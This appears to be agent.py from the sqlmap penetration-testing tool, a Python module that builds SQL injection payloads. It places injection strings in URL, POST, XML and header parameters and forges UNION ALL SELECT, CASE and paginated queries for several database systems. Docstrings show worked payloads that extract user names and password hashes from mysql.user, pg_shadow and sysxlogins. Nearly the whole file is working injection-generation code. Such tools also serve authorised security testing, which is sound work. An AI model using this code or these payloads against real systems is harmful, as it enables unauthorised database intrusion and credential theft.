#!/usr/bin/env python

"""
$Id$

Copyright (c) 2006-2010 sqlmap developers (http://sqlmap.sourceforge.net/)
See the file 'doc/COPYING' for copying permission
"""

import re

from xml.etree import ElementTree as ET

from lib.core.common import Backend
from lib.core.common import getCompiledRegex
from lib.core.common import isDBMSVersionAtLeast
from lib.core.common import isTechniqueAvailable
from lib.core.common import randomInt
from lib.core.common import randomStr
from lib.core.convert import urlencode
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import queries
from lib.core.datatype import advancedDict
from lib.core.enums import DBMS
from lib.core.enums import PAYLOAD
from lib.core.enums import PLACE
from lib.core.exception import sqlmapNoneDataException
from lib.core.settings import FROM_TABLE
from lib.core.settings import PAYLOAD_DELIMITER
from lib.core.settings import URI_INJECTION_MARK_CHAR
from lib.core.unescaper import unescaper

class Agent:
    """
    This class defines the SQL agent methods.
    """

    def payloadDirect(self, query):
        if query.startswith("AND "):
            query = query.replace("AND ", "SELECT ", 1)
        elif query.startswith(" UNION ALL "):
            query = query.replace(" UNION ALL ", "", 1)
        elif query.startswith("; "):
            query = query.replace("; ", "", 1)

        if kb.tamperFunctions:
            for function in kb.tamperFunctions:
                query = function(query)

        return query

    def payload(self, place=None, parameter=None, value=None, newValue=None, where=None):
        """
        This method replaces the affected parameter with the SQL
        injection statement to request
        """

        if conf.direct:
            return self.payloadDirect(newValue)

        retValue = ""

        if where is None and isTechniqueAvailable(kb.technique):
            where = kb.injection.data[kb.technique].where

        # Debug print
        #print "value: %s, newValue: %s, where: %s, kb.technique: %s" % (value, newValue, where, kb.technique)

        if kb.injection.place is not None:
            place = kb.injection.place

        if kb.injection.parameter is not None:
            parameter = kb.injection.parameter

        paramString = conf.parameters[place]
        paramDict = conf.paramDict[place]
        origValue = paramDict[parameter]

        if place == PLACE.URI:
            origValue = origValue.split(URI_INJECTION_MARK_CHAR)[0]
            origValue = origValue[origValue.rfind('/') + 1:]

        if value is None:
            if where == PAYLOAD.WHERE.ORIGINAL:
                value = origValue
            elif where == PAYLOAD.WHERE.NEGATIVE:
                if newValue.startswith("-"):
                    value = ""
                else:
                    value = "-%s" % randomInt()
            elif where == PAYLOAD.WHERE.REPLACE:
                value = ""
            else:
                value = origValue

            newValue = "%s%s" % (value, newValue)

        newValue = self.cleanupPayload(newValue, origValue)

        if "POSTxml" in conf.paramDict and place == PLACE.POST:
            root = ET.XML(paramString)
            iterator = root.getiterator(parameter)

            for child in iterator:
                child.text = self.addPayloadDelimiters(newValue)

            retValue = ET.tostring(root)
        elif place == PLACE.URI:
            retValue = paramString.replace("%s%s" % (origValue, URI_INJECTION_MARK_CHAR), self.addPayloadDelimiters(newValue))
        elif place == PLACE.UA:
            retValue = paramString.replace(origValue, self.addPayloadDelimiters(newValue))
        else:
            retValue = paramString.replace("%s=%s" % (parameter, origValue),
                                           "%s=%s" % (parameter, self.addPayloadDelimiters(newValue)))

        # Debug print
        #print "retValue:", retValue

        return retValue

    def fullPayload(self, query):
        if conf.direct:
            return self.payloadDirect(query)

        query = self.prefixQuery(query)
        query = self.suffixQuery(query)
        payload = self.payload(newValue=query)

        return payload

    def prefixQuery(self, expression, prefix=None, where=None, clause=None):
        """
        This method defines how the input expression has to be escaped
        to perform the injection depending on the injection type
        identified as valid
        """

        if conf.direct:
            return self.payloadDirect(expression)

        expression = self.cleanupPayload(expression)
        expression = unescaper.unescape(expression)
        query = None

        if where is None and kb.technique and kb.technique in kb.injection.data:
            where = kb.injection.data[kb.technique].where

        # If we are replacing (<where>) the parameter original value with
        # our payload do not prepend with the prefix
        if where == PAYLOAD.WHERE.REPLACE:
            query = ""

        # If the technique is stacked queries (<stype>) do not put a space
        # after the prefix or it is in GROUP BY / ORDER BY (<clause>)
        elif kb.technique == PAYLOAD.TECHNIQUE.STACKED:
            query = kb.injection.prefix
        elif kb.injection.clause == [2, 3] or kb.injection.clause == [ 2 ] or kb.injection.clause == [ 3 ]:
            query = kb.injection.prefix
        elif clause == [2, 3] or clause == [ 2 ] or clause == [ 3 ]:
            query = prefix

        # In any other case prepend with the full prefix
        else:
            query = kb.injection.prefix or prefix or ""

            if not (expression and expression[0] == ";"):
                query += " "

        query = "%s%s" % (query, expression)

        return query

    def suffixQuery(self, expression, comment=None, suffix=None, where=None):
        """
        This method appends the DBMS comment to the
        SQL injection request
        """

        if conf.direct:
            return self.payloadDirect(expression)

        expression = self.cleanupPayload(expression)
        expression = unescaper.unescape(expression)

        if comment is not None:
            expression += comment

        if where is None and kb.technique and kb.technique in kb.injection.data:
            where = kb.injection.data[kb.technique].where

        # If we are replacing (<where>) the parameter original value with
        # our payload do not append the suffix
        if where == PAYLOAD.WHERE.REPLACE:
            pass

        elif kb.injection.suffix is not None:
            expression += " %s" % kb.injection.suffix
        elif suffix is not None:
            expression += " %s" % suffix

        return expression.rstrip()

    def cleanupPayload(self, payload, origValue=None):
        if payload is None:
            return

        randInt = randomInt()
        randInt1 = randomInt()
        randStr = randomStr()
        randStr1 = randomStr()

        payload = payload.replace("[RANDNUM]", str(randInt))
        payload = payload.replace("[RANDNUM1]", str(randInt1))
        payload = payload.replace("[RANDSTR]", randStr)
        payload = payload.replace("[RANDSTR1]", randStr1)
        payload = payload.replace("[DELIMITER_START]", kb.misc.start)
        payload = payload.replace("[DELIMITER_STOP]", kb.misc.stop)
        payload = payload.replace("[SPACE_REPLACE]", kb.misc.space)
        payload = payload.replace("[SLEEPTIME]", str(conf.timeSec))

        if origValue is not None:
            payload = payload.replace("[ORIGVALUE]", origValue)

        if "[INFERENCE]" in payload:
            if Backend.getIdentifiedDbms() is not None:
                inference = queries[Backend.getIdentifiedDbms()].inference

                if "dbms_version" in inference:
                    if isDBMSVersionAtLeast(inference.dbms_version):
                        inferenceQuery = inference.query
                    else:
                        inferenceQuery = inference.query2
                else:
                    inferenceQuery = inference.query

                payload = payload.replace("[INFERENCE]", inferenceQuery)
            else:
                errMsg = "invalid usage of inference payload without "
                errMsg += "knowledge of underlying DBMS"
                raise sqlmapNoneDataException, errMsg

        return payload

    def getComment(self, reqObj):
        if "comment" in reqObj:
            comment = reqObj.comment
        else:
            comment = ""

        return comment

    def nullAndCastField(self, field):
        """
        Take in input a field string and return its processed nulled and
        casted field string.

        Examples:

        MySQL input:  VERSION()
        MySQL output: IFNULL(CAST(VERSION() AS CHAR(10000)), ' ')
        MySQL scope:  VERSION()

        PostgreSQL input:  VERSION()
        PostgreSQL output: COALESCE(CAST(VERSION() AS CHARACTER(10000)), ' ')
        PostgreSQL scope:  VERSION()

        Oracle input:  banner
        Oracle output: NVL(CAST(banner AS VARCHAR(4000)), ' ')
        Oracle scope:  SELECT banner FROM v$version WHERE ROWNUM=1

        Microsoft SQL Server input:  @@VERSION
        Microsoft SQL Server output: ISNULL(CAST(@@VERSION AS VARCHAR(8000)), ' ')
        Microsoft SQL Server scope:  @@VERSION

        @param field: field string to be processed
        @type field: C{str}

        @return: field string nulled and casted
        @rtype: C{str}
        """

        # SQLite version 2 does not support neither CAST() nor IFNULL(),
        # introduced only in SQLite version 3
        if Backend.getIdentifiedDbms() == DBMS.SQLITE:
            return field

        if field.startswith("(CASE"):
            nulledCastedField = field
        else:
            nulledCastedField = queries[Backend.getIdentifiedDbms()].cast.query % field
            if Backend.getIdentifiedDbms() == DBMS.ACCESS:
                nulledCastedField = queries[Backend.getIdentifiedDbms()].isnull.query % (nulledCastedField, nulledCastedField)
            else:
                nulledCastedField = queries[Backend.getIdentifiedDbms()].isnull.query % nulledCastedField

        return nulledCastedField

    def nullCastConcatFields(self, fields):
        """
        Take in input a sequence of fields string and return its processed
        nulled, casted and concatenated fields string.

        Examples:

        MySQL input:  user,password
        MySQL output: IFNULL(CAST(user AS CHAR(10000)), ' '),'UWciUe',IFNULL(CAST(password AS CHAR(10000)), ' ')
        MySQL scope:  SELECT user, password FROM mysql.user

        PostgreSQL input:  usename,passwd
        PostgreSQL output: COALESCE(CAST(usename AS CHARACTER(10000)), ' ')||'xRBcZW'||COALESCE(CAST(passwd AS CHARACTER(10000)), ' ')
        PostgreSQL scope:  SELECT usename, passwd FROM pg_shadow

        Oracle input:  COLUMN_NAME,DATA_TYPE
        Oracle output: NVL(CAST(COLUMN_NAME AS VARCHAR(4000)), ' ')||'UUlHUa'||NVL(CAST(DATA_TYPE AS VARCHAR(4000)), ' ')
        Oracle scope:  SELECT COLUMN_NAME, DATA_TYPE FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='%s'

        Microsoft SQL Server input:  name,master.dbo.fn_varbintohexstr(password)
        Microsoft SQL Server output: ISNULL(CAST(name AS VARCHAR(8000)), ' ')+'nTBdow'+ISNULL(CAST(master.dbo.fn_varbintohexstr(password) AS VARCHAR(8000)), ' ')
        Microsoft SQL Server scope:  SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins

        @param fields: fields string to be processed
        @type fields: C{str}

        @return: fields string nulled, casted and concatened
        @rtype: C{str}
        """

        if not Backend.getDbms():
            return fields

        if fields.startswith("(CASE"):
            nulledCastedConcatFields = fields
        else:
            fields = fields.replace(", ", ",")
            fieldsSplitted = fields.split(",")
            dbmsDelimiter = queries[Backend.getIdentifiedDbms()].delimiter.query
            nulledCastedFields = []

            for field in fieldsSplitted:
                nulledCastedFields.append(self.nullAndCastField(field))

            delimiterStr = "%s'%s'%s" % (dbmsDelimiter, kb.misc.delimiter, dbmsDelimiter)
            nulledCastedConcatFields = delimiterStr.join([field for field in nulledCastedFields])

        return nulledCastedConcatFields

    def getFields(self, query):
        """
        Take in input a query string and return its fields (columns) and
        more details.

        Example:

        Input:  SELECT user, password FROM mysql.user
        Output: user,password

        @param query: query to be processed
        @type query: C{str}

        @return: query fields (columns) and more details
        @rtype: C{str}
        """

        prefixRegex = "(?:\s+(?:FIRST|SKIP)\s+\d+)*"
        fieldsSelectTop = re.search("\ASELECT\s+TOP\s+[\d]+\s+(.+?)\s+FROM", query, re.I)
        fieldsSelectDistinct = re.search("\ASELECT%s\s+DISTINCT\((.+?)\)\s+FROM" % prefixRegex, query, re.I)
        fieldsSelectCase = re.search("\ASELECT%s\s+(\(CASE WHEN\s+.+\s+END\))" % prefixRegex, query, re.I)
        fieldsSelectFrom = re.search("\ASELECT%s\s+(.+?)\s+FROM\s+" % prefixRegex, query, re.I)
        fieldsExists = re.search("EXISTS(.*)", query, re.I)
        fieldsSelect = re.search("\ASELECT%s\s+(.*)" % prefixRegex, query, re.I)
        fieldsNoSelect = query

        if fieldsExists:
            fieldsToCastStr = fieldsSelect.groups()[0]
        elif fieldsSelectTop:
            fieldsToCastStr = fieldsSelectTop.groups()[0]
        elif fieldsSelectDistinct:
            fieldsToCastStr = fieldsSelectDistinct.groups()[0]
        elif fieldsSelectCase:
            fieldsToCastStr = fieldsSelectCase.groups()[0]
        elif fieldsSelectFrom:
            fieldsToCastStr = fieldsSelectFrom.groups()[0]
        elif fieldsSelect:
            fieldsToCastStr = fieldsSelect.groups()[0]
        elif fieldsNoSelect:
            fieldsToCastStr = fieldsNoSelect

        # Function
        if re.search("\A\w+\(.*\)", fieldsToCastStr, re.I) or fieldsSelectCase:
            fieldsToCastList = [fieldsToCastStr]
        else:
            fieldsToCastList = fieldsToCastStr.replace(", ", ",")
            fieldsToCastList = fieldsToCastList.split(",")

        return fieldsSelectFrom, fieldsSelect, fieldsNoSelect, fieldsSelectTop, fieldsSelectCase, fieldsToCastList, fieldsToCastStr, fieldsExists

    def simpleConcatQuery(self, query1, query2):
        concatenatedQuery = ""

        if Backend.getIdentifiedDbms() == DBMS.MYSQL:
            concatenatedQuery = "CONCAT(%s,%s)" % (query1, query2)

        elif Backend.getIdentifiedDbms() in (DBMS.PGSQL, DBMS.ORACLE, DBMS.SQLITE):
            concatenatedQuery = "%s||%s" % (query1, query2)

        elif Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.SYBASE):
            concatenatedQuery = "%s+%s" % (query1, query2)

        return concatenatedQuery

    def concatQuery(self, query, unpack=True):
        """
        Take in input a query string and return its processed nulled,
        casted and concatenated query string.

        Examples:

        MySQL input:  SELECT user, password FROM mysql.user
        MySQL output: CONCAT('mMvPxc',IFNULL(CAST(user AS CHAR(10000)), ' '),'nXlgnR',IFNULL(CAST(password AS CHAR(10000)), ' '),'YnCzLl') FROM mysql.user

        PostgreSQL input:  SELECT usename, passwd FROM pg_shadow
        PostgreSQL output: 'HsYIBS'||COALESCE(CAST(usename AS CHARACTER(10000)), ' ')||'KTBfZp'||COALESCE(CAST(passwd AS CHARACTER(10000)), ' ')||'LkhmuP' FROM pg_shadow

        Oracle input:  SELECT COLUMN_NAME, DATA_TYPE FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='USERS'
        Oracle output: 'GdBRAo'||NVL(CAST(COLUMN_NAME AS VARCHAR(4000)), ' ')||'czEHOf'||NVL(CAST(DATA_TYPE AS VARCHAR(4000)), ' ')||'JVlYgS' FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='USERS'

        Microsoft SQL Server input:  SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins
        Microsoft SQL Server output: 'QQMQJO'+ISNULL(CAST(name AS VARCHAR(8000)), ' ')+'kAtlqH'+ISNULL(CAST(master.dbo.fn_varbintohexstr(password) AS VARCHAR(8000)), ' ')+'lpEqoi' FROM master..sysxlogins

        @param query: query string to be processed
        @type query: C{str}

        @return: query string nulled, casted and concatenated
        @rtype: C{str}
        """

        if unpack:
            concatenatedQuery = ""
            query = query.replace(", ", ",")

            fieldsSelectFrom, fieldsSelect, fieldsNoSelect, fieldsSelectTop, fieldsSelectCase, _, fieldsToCastStr, fieldsExists = self.getFields(query)
            castedFields = self.nullCastConcatFields(fieldsToCastStr)
            concatenatedQuery = query.replace(fieldsToCastStr, castedFields, 1)
        else:
            concatenatedQuery = query
            fieldsSelectFrom, fieldsSelect, fieldsNoSelect, fieldsSelectTop, fieldsSelectCase, _, fieldsToCastStr, fieldsExists = self.getFields(query)

        if Backend.getIdentifiedDbms() == DBMS.MYSQL:
            if fieldsExists:
                concatenatedQuery = concatenatedQuery.replace("SELECT ", "CONCAT('%s'," % kb.misc.start, 1)
                concatenatedQuery += ",'%s')" % kb.misc.stop
            elif fieldsSelectCase:
                concatenatedQuery = concatenatedQuery.replace("SELECT ", "CONCAT('%s'," % kb.misc.start, 1)
                concatenatedQuery += ",'%s')" % kb.misc.stop
            elif fieldsSelectFrom:
                concatenatedQuery = concatenatedQuery.replace("SELECT ", "CONCAT('%s'," % kb.misc.start, 1)
                concatenatedQuery = concatenatedQuery.replace(" FROM ", ",'%s') FROM " % kb.misc.stop, 1)
            elif fieldsSelect:
                concatenatedQuery = concatenatedQuery.replace("SELECT ", "CONCAT('%s'," % kb.misc.start, 1)
                concatenatedQuery += ",'%s')" % kb.misc.stop
            elif fieldsNoSelect:
                concatenatedQuery = "CONCAT('%s',%s,'%s')" % (kb.misc.start, concatenatedQuery, kb.misc.stop)

        elif Backend.getIdentifiedDbms() in (DBMS.PGSQL, DBMS.ORACLE, DBMS.SQLITE):
            if fieldsExists:
                concatenatedQuery = concatenatedQuery.replace("SELECT ", "'%s'||" % kb.misc.start, 1)
                concatenatedQuery += "||'%s'" % kb.misc.stop
            elif fieldsSelectCase:
                concatenatedQuery = concatenatedQuery.replace("SELECT ", "'%s'||(SELECT " % kb.misc.start, 1)
                concatenatedQuery += ")||'%s'" % kb.misc.stop
            elif fieldsSelectFrom:
                concatenatedQuery = concatenatedQuery.replace("SELECT ", "'%s'||" % kb.misc.start, 1)
                concatenatedQuery = concatenatedQuery.replace(" FROM ", "||'%s' FROM " % kb.misc.stop, 1)
            elif fieldsSelect:
                concatenatedQuery = concatenatedQuery.replace("SELECT ", "'%s'||" % kb.misc.start, 1)
                concatenatedQuery += "||'%s'" % kb.misc.stop
            elif fieldsNoSelect:
                concatenatedQuery = "'%s'||%s||'%s'" % (kb.misc.start, concatenatedQuery, kb.misc.stop)

        elif Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.SYBASE):
            if fieldsExists:
                concatenatedQuery = concatenatedQuery.replace("SELECT ", "'%s'+" % kb.misc.start, 1)
                concatenatedQuery += "+'%s'" % kb.misc.stop
            elif fieldsSelectTop:
                topNum = re.search("\ASELECT\s+TOP\s+([\d]+)\s+", concatenatedQuery, re.I).group(1)
                concatenatedQuery = concatenatedQuery.replace("SELECT TOP %s " % topNum, "TOP %s '%s'+" % (topNum, kb.misc.start), 1)
                concatenatedQuery = concatenatedQuery.replace(" FROM ", "+'%s' FROM " % kb.misc.stop, 1)
            elif fieldsSelectCase:
                concatenatedQuery = concatenatedQuery.replace("SELECT ", "'%s'+" % kb.misc.start, 1)
                concatenatedQuery += "+'%s'" % kb.misc.stop
            elif fieldsSelectFrom:
                concatenatedQuery = concatenatedQuery.replace("SELECT ", "'%s'+" % kb.misc.start, 1)
                concatenatedQuery = concatenatedQuery.replace(" FROM ", "+'%s' FROM " % kb.misc.stop, 1)
            elif fieldsSelect:
                concatenatedQuery = concatenatedQuery.replace("SELECT ", "'%s'+" % kb.misc.start, 1)
                concatenatedQuery += "+'%s'" % kb.misc.stop
            elif fieldsNoSelect:
                concatenatedQuery = "'%s'+%s+'%s'" % (kb.misc.start, concatenatedQuery, kb.misc.stop)

        return concatenatedQuery

    def forgeInbandQuery(self, query, position, count, comment, prefix, suffix, char, multipleUnions=None):
        """
        Take in input an query (pseudo query) string and return its
        processed UNION ALL SELECT query.

        Examples:

        MySQL input:  CONCAT(CHAR(120,121,75,102,103,89),IFNULL(CAST(user AS CHAR(10000)), CHAR(32)),CHAR(106,98,66,73,109,81),IFNULL(CAST(password AS CHAR(10000)), CHAR(32)),CHAR(105,73,99,89,69,74)) FROM mysql.user
        MySQL output:  UNION ALL SELECT NULL, CONCAT(CHAR(120,121,75,102,103,89),IFNULL(CAST(user AS CHAR(10000)), CHAR(32)),CHAR(106,98,66,73,109,81),IFNULL(CAST(password AS CHAR(10000)), CHAR(32)),CHAR(105,73,99,89,69,74)), NULL FROM mysql.user-- AND 7488=7488

        PostgreSQL input:  (CHR(116)||CHR(111)||CHR(81)||CHR(80)||CHR(103)||CHR(70))||COALESCE(CAST(usename AS CHARACTER(10000)), (CHR(32)))||(CHR(106)||CHR(78)||CHR(121)||CHR(111)||CHR(84)||CHR(85))||COALESCE(CAST(passwd AS CHARACTER(10000)), (CHR(32)))||(CHR(108)||CHR(85)||CHR(122)||CHR(85)||CHR(108)||CHR(118)) FROM pg_shadow
        PostgreSQL output:  UNION ALL SELECT NULL, (CHR(116)||CHR(111)||CHR(81)||CHR(80)||CHR(103)||CHR(70))||COALESCE(CAST(usename AS CHARACTER(10000)), (CHR(32)))||(CHR(106)||CHR(78)||CHR(121)||CHR(111)||CHR(84)||CHR(85))||COALESCE(CAST(passwd AS CHARACTER(10000)), (CHR(32)))||(CHR(108)||CHR(85)||CHR(122)||CHR(85)||CHR(108)||CHR(118)), NULL FROM pg_shadow-- AND 7133=713

        Oracle input:  (CHR(109)||CHR(89)||CHR(75)||CHR(109)||CHR(85)||CHR(68))||NVL(CAST(COLUMN_NAME AS VARCHAR(4000)), (CHR(32)))||(CHR(108)||CHR(110)||CHR(89)||CHR(69)||CHR(122)||CHR(90))||NVL(CAST(DATA_TYPE AS VARCHAR(4000)), (CHR(32)))||(CHR(89)||CHR(80)||CHR(98)||CHR(77)||CHR(80)||CHR(121)) FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME=(CHR(85)||CHR(83)||CHR(69)||CHR(82)||CHR(83))
        Oracle output:  UNION ALL SELECT NULL, (CHR(109)||CHR(89)||CHR(75)||CHR(109)||CHR(85)||CHR(68))||NVL(CAST(COLUMN_NAME AS VARCHAR(4000)), (CHR(32)))||(CHR(108)||CHR(110)||CHR(89)||CHR(69)||CHR(122)||CHR(90))||NVL(CAST(DATA_TYPE AS VARCHAR(4000)), (CHR(32)))||(CHR(89)||CHR(80)||CHR(98)||CHR(77)||CHR(80)||CHR(121)), NULL FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME=(CHR(85)||CHR(83)||CHR(69)||CHR(82)||CHR(83))-- AND 6738=6738

        Microsoft SQL Server input:  (CHAR(74)+CHAR(86)+CHAR(106)+CHAR(116)+CHAR(116)+CHAR(108))+ISNULL(CAST(name AS VARCHAR(8000)), (CHAR(32)))+(CHAR(89)+CHAR(87)+CHAR(116)+CHAR(100)+CHAR(106)+CHAR(74))+ISNULL(CAST(master.dbo.fn_varbintohexstr(password) AS VARCHAR(8000)), (CHAR(32)))+(CHAR(71)+CHAR(74)+CHAR(68)+CHAR(66)+CHAR(85)+CHAR(106)) FROM master..sysxlogins
        Microsoft SQL Server output:  UNION ALL SELECT NULL, (CHAR(74)+CHAR(86)+CHAR(106)+CHAR(116)+CHAR(116)+CHAR(108))+ISNULL(CAST(name AS VARCHAR(8000)), (CHAR(32)))+(CHAR(89)+CHAR(87)+CHAR(116)+CHAR(100)+CHAR(106)+CHAR(74))+ISNULL(CAST(master.dbo.fn_varbintohexstr(password) AS VARCHAR(8000)), (CHAR(32)))+(CHAR(71)+CHAR(74)+CHAR(68)+CHAR(66)+CHAR(85)+CHAR(106)), NULL FROM master..sysxlogins-- AND 3254=3254

        @param query: it is a processed query string unescaped to be
        forged within an UNION ALL SELECT statement
        @type query: C{str}

        @param position: it is the NULL position where it is possible
        to inject the query
        @type position: C{int}

        @return: UNION ALL SELECT query string forged
        @rtype: C{str}
        """

        if query.startswith("SELECT "):
            query = query[len("SELECT "):]

        inbandQuery = self.prefixQuery("UNION ALL SELECT ", prefix=prefix)

        if query.startswith("TOP"):
            topNum = re.search("\ATOP\s+([\d]+)\s+", query, re.I).group(1)
            query = query[len("TOP %s " % topNum):]
            inbandQuery += "TOP %s " % topNum

        intoRegExp = re.search("(\s+INTO (DUMP|OUT)FILE\s+\'(.+?)\')", query, re.I)

        if intoRegExp:
            intoRegExp = intoRegExp.group(1)
            query = query[:query.index(intoRegExp)]

        if Backend.getIdentifiedDbms() in FROM_TABLE and inbandQuery.endswith(FROM_TABLE[Backend.getIdentifiedDbms()]):
            inbandQuery = inbandQuery[:-len(FROM_TABLE[Backend.getIdentifiedDbms()])]

        for element in range(0, count):
            if element > 0:
                inbandQuery += ", "

            if element == position:
                if " FROM " in query and "(CASE " not in query and "EXISTS(" not in query and not query.startswith("SELECT "):
                    conditionIndex = query.index(" FROM ")
                    inbandQuery += query[:conditionIndex]
                else:
                    inbandQuery += query
            else:
                inbandQuery += char

        if " FROM " in query and "(CASE" not in query and "EXISTS(" not in query and not query.startswith("SELECT "):
            conditionIndex = query.index(" FROM ")
            inbandQuery += query[conditionIndex:]

        if Backend.getIdentifiedDbms() in FROM_TABLE:
            if " FROM " not in inbandQuery or "(CASE " in inbandQuery:
                inbandQuery += FROM_TABLE[Backend.getIdentifiedDbms()]

        if intoRegExp:
            inbandQuery += intoRegExp

        if multipleUnions:
            inbandQuery += " UNION ALL SELECT "

            for element in range(count):
                if element > 0:
                    inbandQuery += ", "

                if element == position:
                    inbandQuery += multipleUnions
                else:
                    inbandQuery += char

            if Backend.getIdentifiedDbms() in FROM_TABLE:
                inbandQuery += FROM_TABLE[Backend.getIdentifiedDbms()]

        inbandQuery = self.suffixQuery(inbandQuery, comment, suffix)

        return inbandQuery

    def limitQuery(self, num, query, field=None):
        """
        Take in input a query string and return its limited query string.

        Example:

        Input:  SELECT user FROM mysql.users
        Output: SELECT user FROM mysql.users LIMIT <num>, 1

        @param num: limit number
        @type num: C{int}

        @param query: query to be processed
        @type query: C{str}

        @param field: field within the query
        @type field: C{list}

        @return: limited query string
        @rtype: C{str}
        """

        limitedQuery = query
        limitStr = queries[Backend.getIdentifiedDbms()].limit.query
        fromIndex = limitedQuery.index(" FROM ")
        untilFrom = limitedQuery[:fromIndex]
        fromFrom = limitedQuery[fromIndex+1:]
        orderBy = False

        if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL, DBMS.SQLITE):
            limitStr = queries[Backend.getIdentifiedDbms()].limit.query % (num, 1)
            limitedQuery += " %s" % limitStr

        elif Backend.getIdentifiedDbms() == DBMS.FIREBIRD:
            limitStr = queries[Backend.getIdentifiedDbms()].limit.query % (num+1, num+1)
            limitedQuery += " %s" % limitStr

        elif Backend.getIdentifiedDbms() == DBMS.ORACLE:
            if " ORDER BY " in limitedQuery and "(SELECT " in limitedQuery:
                orderBy = limitedQuery[limitedQuery.index(" ORDER BY "):]
                limitedQuery = limitedQuery[:limitedQuery.index(" ORDER BY ")]

            if query.startswith("SELECT "):
                limitedQuery = "%s FROM (%s, %s" % (untilFrom, untilFrom, limitStr)
            else:
                limitedQuery = "%s FROM (SELECT %s, %s" % (untilFrom, ", ".join(f for f in field), limitStr)
            limitedQuery = limitedQuery % fromFrom
            limitedQuery += "=%d" % (num + 1)

        elif Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.SYBASE):
            forgeNotIn = True

            if " ORDER BY " in limitedQuery:
                orderBy = limitedQuery[limitedQuery.index(" ORDER BY "):]
                limitedQuery = limitedQuery[:limitedQuery.index(" ORDER BY ")]

            notDistincts = re.findall("DISTINCT[\(\s+](.+?)\)*\s+", limitedQuery, re.I)

            for notDistinct in notDistincts:
                limitedQuery = limitedQuery.replace("DISTINCT(%s)" % notDistinct, notDistinct)
                limitedQuery = limitedQuery.replace("DISTINCT %s" % notDistinct, notDistinct)

            if limitedQuery.startswith("SELECT TOP ") or limitedQuery.startswith("TOP "):
                topNums = re.search(queries[Backend.getIdentifiedDbms()].limitregexp.query, limitedQuery, re.I)

                if topNums:
                    topNums = topNums.groups()
                    quantityTopNums = topNums[0]
                    limitedQuery = limitedQuery.replace("TOP %s" % quantityTopNums, "TOP 1", 1)
                    startTopNums = topNums[1]
                    limitedQuery = limitedQuery.replace(" (SELECT TOP %s" % startTopNums, " (SELECT TOP %d" % num)
                    forgeNotIn = False
                else:
                    topNum = re.search("TOP\s+([\d]+)\s+", limitedQuery, re.I).group(1)
                    limitedQuery = limitedQuery.replace("TOP %s " % topNum, "")

            if forgeNotIn:
                limitedQuery = limitedQuery.replace("SELECT ", (limitStr % 1), 1)

                if " WHERE " in limitedQuery:
                    limitedQuery = "%s AND %s " % (limitedQuery, field)
                else:
                    limitedQuery = "%s WHERE %s " % (limitedQuery, field)

                limitedQuery += "NOT IN (%s" % (limitStr % num)
                limitedQuery += "%s %s)" % (field, fromFrom)

        if orderBy:
            limitedQuery += orderBy

        return limitedQuery

    def forgeCaseStatement(self, expression):
        """
        Take in input a query string and return its CASE statement query
        string.

        Example:

        Input:  (SELECT super_priv FROM mysql.user WHERE user=(SUBSTRING_INDEX(CURRENT_USER(), '@', 1)) LIMIT 0, 1)='Y'
        Output: SELECT (CASE WHEN ((SELECT super_priv FROM mysql.user WHERE user=(SUBSTRING_INDEX(CURRENT_USER(), '@', 1)) LIMIT 0, 1)='Y') THEN 1 ELSE 0 END)

        @param expression: expression to be processed
        @type num: C{str}

        @return: processed expression
        @rtype: C{str}
        """

        caseExpression = expression

        if Backend.getIdentifiedDbms() is not None and hasattr(queries[Backend.getIdentifiedDbms()], "case"):
            caseExpression = queries[Backend.getIdentifiedDbms()].case.query % expression

            if Backend.getIdentifiedDbms() in FROM_TABLE and not caseExpression.upper().endswith(FROM_TABLE[Backend.getIdentifiedDbms()]):
                caseExpression += FROM_TABLE[Backend.getIdentifiedDbms()]

        return caseExpression

    def addPayloadDelimiters(self, inpStr):
        """
        Adds payload delimiters around the input string
        """
        retVal = inpStr

        if inpStr:
            retVal = "%s%s%s" % (PAYLOAD_DELIMITER, inpStr, PAYLOAD_DELIMITER)

        return retVal

    def removePayloadDelimiters(self, inpStr):
        """
        Removes payload delimiters from inside the input string
        """
        retVal = inpStr

        if inpStr:
            retVal = retVal.replace(PAYLOAD_DELIMITER, '')

        return retVal

    def extractPayload(self, inpStr):
        """
        Extracts payload from inside of the input string
        """
        retVal = None

        if inpStr:
            regObj = getCompiledRegex("%s(?P<result>.*?)%s" % (PAYLOAD_DELIMITER, PAYLOAD_DELIMITER))
            match = regObj.search(inpStr)

            if match:
                retVal = match.group("result")

        return retVal

    def replacePayload(self, inpStr, payload):
        """
        Replaces payload inside the input string with a given payload
        """
        retVal = inpStr

        if inpStr:
            regObj = getCompiledRegex("(%s.*?%s)" % (PAYLOAD_DELIMITER, PAYLOAD_DELIMITER))
            retVal = regObj.sub("%s%s%s" % (PAYLOAD_DELIMITER, payload, PAYLOAD_DELIMITER), inpStr)

        return retVal

# SQL agent
agent = Agent()
